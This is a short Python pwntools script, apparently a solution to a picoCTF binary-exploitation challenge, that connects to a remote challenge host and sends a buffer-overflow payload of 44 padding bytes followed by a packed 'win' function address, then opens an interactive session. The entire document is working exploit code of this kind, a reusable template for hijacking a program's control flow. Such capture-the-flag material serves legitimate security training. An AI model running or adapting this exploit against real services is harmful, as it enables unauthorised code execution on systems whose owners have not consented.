from pwn import *

# p = process('./vuln')
p = remote('dolphin-cove.picoctf.net', 61801)

offset = 44

win_address = 0x8049276

payload = b"A" * offset + p64(win_address)

p.recvuntil(b"Enter the secret key:")

p.sendline(payload)

p.interactive()
